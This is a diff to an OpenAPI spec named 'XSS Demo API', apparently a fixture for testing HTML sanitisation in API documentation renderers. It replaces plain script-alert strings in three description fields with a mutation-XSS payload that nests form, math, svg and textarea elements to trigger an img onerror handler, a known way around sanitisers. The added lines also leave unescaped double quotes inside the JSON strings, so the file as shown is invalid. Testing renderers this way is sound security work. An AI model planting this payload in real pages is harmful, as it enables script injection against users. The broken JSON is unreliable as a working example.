@@ -3,13 +3,13 @@
   "info": {
     "title": "XSS Demo API",
     "version": "1.0",
-    "description": "<script>alert('XSS Attack!');</script>"
+    "description": "  <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>"
   },
   "paths": {
     "/example": {
       "get": {
         "summary": "Example endpoint",
-        "description": "<script>alert('XSS in endpoint description!');</script>",
+        "description": "  <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>",
         "responses": {
           "200": {
             "description": "Success",
@@ -18,7 +18,7 @@
               "properties": {
                 "message": {
                   "type": "string",
-                  "description": "<script>alert('XSS in response description!');</script>"
+                  "description": "  <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>"
                 }
               }
             }
